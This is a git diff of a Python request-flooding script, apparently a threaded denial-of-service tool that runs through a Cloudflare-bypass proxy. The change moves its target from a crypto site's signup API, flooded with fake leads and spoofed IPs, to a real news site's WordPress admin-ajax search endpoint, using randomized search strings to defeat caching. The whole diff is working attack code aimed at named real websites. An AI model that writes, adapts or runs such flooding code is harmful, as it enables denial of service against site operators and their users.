@@ -89,11 +89,11 @@ def attackUrlCF(baseUrl, threadNumber):
 
 	while True:
 		try:
-			url = baseUrl + '/api/'
+			url = baseUrl
 			# url = baseUrl + '/author/jimmyaki/page/' + str(random.randint(1,100))
 
 			ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-			data = {'first_name':"assdasfdgsdfgsdfgd",'last_name':"asdfgsdfgsdfgsdfgsd",'email':"ads" +  str(random.randint(1,100)) + "@asd.com",'area_code':"+31",'phone':"062929" + str(random.randint(1000,9999)) ,'funnel':"v1-x-bitcoin-club-com",'_ip':ip }
+			data = {'action':"b2c_ajax_search",'s':"sdfasdf" + str(random.randint(1,100000000))}
 
 			headers={'User-Agent': userAgent,
 			'Accept-Language': 'en-US,en;q=0.9',
@@ -139,7 +139,7 @@ def attackAll():
 flareSolverUrl = 'http://localhost:8191/v1'
 
 for i in range(1):
-	Thread(target=attackUrlCF, args=['https://x-bitcoin-club.com', i]).start()
+	Thread(target=attackUrlCF, args=['https://www.business2community.com/wp-admin/admin-ajax.php', i]).start()
 	time.sleep(30)
 input()
 
